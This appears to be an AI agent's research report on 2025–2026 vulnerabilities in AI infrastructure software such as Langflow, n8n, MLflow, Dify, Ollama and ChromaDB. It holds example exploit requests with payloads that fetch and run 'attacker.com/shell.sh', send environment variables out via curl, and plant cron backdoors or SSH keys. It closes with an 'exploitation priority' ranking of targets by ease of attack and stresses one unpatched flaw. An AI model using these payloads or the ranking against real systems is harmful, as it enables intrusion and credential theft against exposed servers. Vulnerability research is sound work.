# 🔴 AI INFRASTRUCTURE CVE DEEP RESEARCH REPORT — 2025/2026
## Compiled: 2026-05-29 | Agent: general-6448a6ad

---

## 1. CVE-2026-33017 — Langflow Unauthenticated RCE (CVSS 9.8/10.0)

**Target:** Langflow ≤ 1.8.1  
**Type:** Unauthenticated Remote Code Execution  
**Published:** 2026-03-16  
**CISA KEV:** YES — Added to Known Exploited Vulnerabilities catalog  
**Exploited in wild:** YES — Attackers compromised Langflow instances within 20 hours of disclosure

### Root Cause
The `POST /api/v1/build_public_tmp/{flow_id}/flow` endpoint is designed for unauthenticated public flow builds but incorrectly accepts attacker-supplied flow data containing arbitrary executable code. This code is passed to `prepare_global_scope()` in `validate.py`, which calls `exec()` **without any sandboxing**.

### Exploitation Technique
```
POST /api/v1/build_public_tmp/{flow_id}/flow HTTP/1.1
Content-Type: application/json

{
  "data": {
    "nodes": [{
      "type": "PythonFunction",
      "data": {
        "code": "import os; os.system('id; curl attacker.com/shell.sh|bash')"
      }
    }]
  }
}
```
- **No auth required** — the endpoint is explicitly public
- Code reaches `exec()` directly — no sandbox, no allowlisting
- Response includes execution output

### Key References
- GitHub Advisory: GHSA-vwmf-pq79-vjvx
- PoC Repo: `MaxMnMl/langflow-CVE-2026-33017-poc`
- Sysdig analysis: Attackers exploited within 20 hours
- Patched in: Langflow 1.9.0+

---

## 2. CVE-2026-21858 — n8n "Ni8mare" Unauthenticated RCE (CVSS 10.0)

**Target:** n8n 0.211.0 ≤ versions < 1.120.4, 1.121.1, 1.122.0  
**Type:** Content-Type Confusion → Arbitrary File Read → RCE Chain  
**Published:** 2026-01-07  
**Impact:** 100,000+ exposed n8n servers

### Root Cause
n8n's webhook/form trigger endpoint processes `multipart/form-data` requests. When a malicious `Content-Type` header is sent, the parser:
1. Treats the request body as form data instead of file uploads
2. File data gets populated into `req.body.files`
3. Downstream nodes (like "Read File from Binary") can be tricked into reading arbitrary files
4. File content exfiltrated via Respond Webhook node

### Exploitation Chain
```
Step 1: Send crafted Content-Type confusion request to n8n webhook
Step 2: File path traversal reads /etc/passwd, /etc/shadow, SSH keys
Step 3: Use extracted credentials for RCE
Step 4: (Blind) If no Respond node exists, use OOB or timing exfiltration
```

### PoC Available
- GitHub: `Chocapikk/CVE-2026-21858` — Full exploit chain
- 35 public PoC/exploits on GitHub
- Cyera Research Labs original discovery

### Patched in: n8n 1.120.4, 1.121.1, 1.122.0+

---

## 3. CVE-2025-11201 — MLflow Tracking Server Directory Traversal RCE (CVSS 9.8)

**Target:** MLflow Tracking Server (unpatched versions)  
**Type:** Directory Traversal → Remote Code Execution  
**Published:** 2025-10-29  
**Auth Required:** NONE (unauthenticated)

### Root Cause
MLflow Tracking Server fails to properly validate user-supplied paths in model file paths during model creation. Attacker crafts model registration with path traversal (`../`) to write files to arbitrary locations.

### Exploitation Technique
```
POST /api/2.0/mlflow/model-versions/create
{
  "name": "malicious_model",
  "source": "file:///../../tmp/malicious",
  "run_id": "..."
}
# Upload malicious artifact written to:
# - /etc/cron.d/backdoor
# - /home/user/.ssh/authorized_keys
# - Web root shell
```

### Key References
- GitHub Advisory: GHSA-5cvj-7rg6-jggj
- ZeroPath analysis confirms full exploitation chain
- Snyk: SNYK-PYTHON-MLFLOW-13774699

---

## 4. CVE-2025-3466 — Dify JavaScript Sandbox Escape (CVSS 8.8)

**Target:** langgenius/dify ≤ 0.9.1  
**Type:** JavaScript Sandbox Escape → Arbitrary Code Execution  
**Published:** 2025-07-07

### Root Cause
Global functions like `parseInt` can be **overridden before sandbox security restrictions are imposed**, allowing arbitrary code execution outside the sandbox context.

### Exploitation Technique
```javascript
const originalParseInt = parseInt;
parseInt = function() {
  const { execSync } = require('child_process');
  execSync('curl attacker.com/exfil?data=$(env | base64)');
  return originalParseInt.apply(this, arguments);
};
```

### Impact: Access to API keys, DB credentials, SSRF to internal services, lateral movement  
### Patched in: Dify 1.x+

---

## 5. Ollama Vulnerabilities (Multiple CVEs)

### CVE-2026-7482 — GGUF Heap OOB Read (CVSS 7.1)
- Ollama < 0.17.1
- Crafted GGUF tensor offset/size > file size → memory leak
- Leaks API keys, model data, tokens from process memory

### CVE-2025-63389 — Authentication Bypass (CVSS 9.8)
- Ollama ≤ 0.12.3
- `/api/pull`, `/api/push`, `/api/copy`, `/api/delete` — all unauthenticated
- Pull/push/delete models remotely, exfiltrate data, DoS

### CVE-2025-15063 — MCP Server execAsync RCE (CVSS 9.8)
- Ollama MCP Server — command injection in `execAsync`
- Unauthenticated RCE — full server takeover

### CVE-2026-42249 — Windows Auto-Update RCE
- Path traversal + missing signature verification in Ollama Windows updater
- Persistent code execution via malicious update

---

## 6. CVE-2026-45829 — ChromaDB "ChromaToast" Pre-Auth RCE (CVSS 10.0)

**Target:** ChromaDB (Python FastAPI server) ≤ v1.5.9  
**Status:** UNPATCHED as of v1.5.9  
**Type:** Pre-Authentication Remote Code Execution

### Root Cause (Two Compounding Failures)
1. **Race Condition:** Server loads attacker-controlled embedding-function config **before** auth check
2. **Trust Remote Code:** `trust_remote_code: true` + `model_name` → attacker-controlled HuggingFace repo → arbitrary Python execution

### Exploitation
```python
# Step 1: Create HuggingFace repo with malicious code
# attacker/evil-embedding-model/config.json
# {"model_type": "custom", "auto_map": {"AutoModel": "model.py"}}
# model.py → import os; os.system("curl attacker.com/shell.sh|bash")

# Step 2: Create collection (pre-auth!)
POST /api/v2/{tenant}/collections
{
  "name": "pwned",
  "get_or_create": true,
  "embedding_function": {
    "type": "HuggingFaceEmbeddingFunction",
    "model_name": "attacker/evil-embedding-model",
    "trust_remote_code": true
  }
}
# Server executes code FIRST, then returns 403 Forbidden AFTER
```

### Key: Server executes your code, THEN returns 403. Authentication check is too late.

---

## 7. ComfyUI Vulnerabilities

### CVE-2025-67303 — ComfyUI-Manager Config Overwrite (HIGH)
- ComfyUI-Manager < 3.38
- Upload files → overwrite config.ini → downgrade security_level to weak → install malicious nodes → RCE
- Tencent Xuanwu Lab discovery

### CVE-2026-22777 — ComfyUI-Manager CRLF Injection (CVSS 8.8)
- ComfyUI-Manager < 4.0.5
- CRLF injection in `write_config` via HTTP query parameters
- 7 public PoCs on GitHub

### ComfyUI Cryptomining Botnet (March 2026 campaign)
- 1,000+ exposed instances exploited for Monero mining

---

## 8. LibreChat Vulnerabilities

### CVE-2025-69222 — SSRF (CVSS 9.1)
- LibreChat 0.8.1-rc2 — Actions feature missing restrictions
- Patched in 0.8.2-rc2

### CVE-2026-33265 — JWT Token Reuse (CVSS 6.3)
- JWT works across both API and RAG API
- Privilege escalation between services

### CVE-2025-7105 — DoS via Fork Function (MEDIUM)
- Unrestricted `/api/convos/fork` → JavaScript heap OOM → persistent DoS

### CVE-2026-22252 — MCP STDIO Command Injection
- Part of MCP supply chain vulnerability disclosure

---

## 9. CVE-2026-41487 — Langfuse RBAC Bypass (CVSS 5.4)

**Target:** Langfuse 3.68.0 ≤ versions < 3.167.0  
**Type:** Improper RBAC in LLM connection update flow  
**Published:** 2026-04-08

### Impact
- Lower-privilege users can access **plaintext API keys** for LLM providers
- Modify LLM connection configurations
- Direct financial impact (stolen API keys)

### Patched in: Langfuse 3.167.0+

---

## 10. GGUF Parser Vulnerabilities (Critical Supply Chain)

### CVE-2026-33298 — llama.cpp Integer Overflow → Heap Buffer Overflow (CVSS 9.8)
- llama.cpp < b7824
- `ggml_nbytes()` integer overflow with crafted tensor dimensions
- Affects **ALL** GGUF consumers: Ollama, LM Studio, KoboldCpp, etc.

### CVE-2026-5760 — SGLang RCE via Malicious GGUF (CVSS 9.8)
- SGLang ≤ 0.5.9
- `/v1/rerank` endpoint renders unsandboxed Jinja2 templates from GGUF metadata
- Malicious GGUF → SSTI → RCE
- **PoC:** `Stuub/SGLang-0.5.9-RCE` on GitHub

### CVE-2025-66960 — Ollama DoS via GGUF Parser (MEDIUM)
- Untrusted string length reads in GGUF metadata → service crash

---

## SUMMARY TABLE

| # | CVE | Product | Type | CVSS | Auth | PoC | Wild |
|---|-----|---------|------|------|-----|-----|------|
| 1 | CVE-2026-33017 | Langflow | Unauth RCE | 9.8 | None | ✅ | ✅ 20hrs |
| 2 | CVE-2026-21858 | n8n | File Read→RCE | 10.0 | None | ✅ 35 | ✅ |
| 3 | CVE-2025-11201 | MLflow | Dir Traversal RCE | 9.8 | None | ✅ | Likely |
| 4 | CVE-2025-3466 | Dify | Sandbox Escape | 8.8 | Low | Partial | Unknown |
| 5a | CVE-2026-7482 | Ollama | Heap OOB Read | 7.1 | None | Partial | Unknown |
| 5b | CVE-2025-63389 | Ollama | Auth Bypass | 9.8 | None | ✅ | Likely |
| 5c | CVE-2025-15063 | Ollama MCP | Cmd Injection | 9.8 | None | ✅ | Unknown |
| 5d | CVE-2026-42249 | Ollama Win | Auto-Update RCE | 8.0 | None | Partial | Unknown |
| 6 | CVE-2026-45829 | ChromaDB | Pre-Auth RCE | 10.0 | None | ✅ | Unknown |
| 7a | CVE-2025-67303 | ComfyUI-Mgr | Config Overwrite | High | None | ✅ | ✅ Botnet |
| 7b | CVE-2026-22777 | ComfyUI-Mgr | CRLF Injection | 8.8 | None | ✅ 7 | Unknown |
| 8a | CVE-2025-69222 | LibreChat | SSRF | 9.1 | User | ✅ | Unknown |
| 8b | CVE-2026-33265 | LibreChat | JWT Reuse | 6.3 | User | Partial | Unknown |
| 8c | CVE-2025-7105 | LibreChat | DoS | Medium | User | ✅ | Unknown |
| 9 | CVE-2026-41487 | Langfuse | RBAC Bypass | 5.4 | Low | Partial | Unknown |
| 10a | CVE-2026-33298 | llama.cpp | Int Overflow | 9.8 | N/A | ✅ | Unknown |
| 10b | CVE-2026-5760 | SGLang | SSTI→RCE | 9.8 | None | ✅ | Unknown |

---

## EXPLOITATION PRIORITY (Impact × Ease)

1. 🥇 **CVE-2026-45829 ChromaDB** — CVSS 10.0, UNPATCHED, single POST request, pre-auth
2. 🥈 **CVE-2026-21858 n8n** — CVSS 10.0, 35 PoCs, 100K+ exposed
3. 🥉 **CVE-2026-33017 Langflow** — CVSS 9.8, CISA KEV, wild exploitation
4. **CVE-2025-11201 MLflow** — CVSS 9.8, unauthenticated, trivial path traversal
5. **CVE-2025-63389 Ollama Auth Bypass** — CVSS 9.8, wide-open APIs
6. **CVE-2025-15063 Ollama MCP** — CVSS 9.8, command injection
7. **CVE-2026-33298 llama.cpp** — CVSS 9.8, supply chain (ALL GGUF tools)
8. **CVE-2026-5760 SGLang** — CVSS 9.8, malicious model → RCE
9. **CVE-2026-22777 ComfyUI** — CRLF injection, active botnet campaign
10. **CVE-2025-69222 LibreChat** — SSRF with clear exploitation path

---

## KEY PATTERN: AI INFRASTRUCTURE SECURITY FAILURE MODES

1. **Unauthenticated endpoints** — AI tools prioritize ease-of-use over security
2. **Code execution from untrusted data** — GGUF models, Python exec(), Jinja2 templates, JS sandboxes
3. **Supply chain via model files** — A single malicious GGUF pwns EVERY consumer
4. **Missing authentication as a "feature"** — Ollama, ChromaDB, MLflow
5. **Auth ordering race conditions** — ChromaDB runs code BEFORE auth check
6. **Sandbox escapes** — Dify parseInt override, SGLang Jinja2, n8n Content-Type confusion